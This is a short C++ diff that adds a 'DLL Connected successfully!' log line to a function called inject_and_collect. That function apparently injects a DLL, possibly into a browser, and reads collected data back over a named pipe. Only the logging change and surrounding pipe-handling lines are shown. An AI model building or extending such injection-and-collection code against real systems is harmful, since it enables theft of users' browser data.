@@ -207,6 +207,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
     if (h_pipe != INVALID_HANDLE_VALUE) {
         std::cout << "Waiting for DLL connection..." << std::endl;
         if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
+            std::cout << "DLL Connected successfully!" << std::endl;
             std::vector<char> buffer;
             char temp[8192];
             DWORD bytes_read;
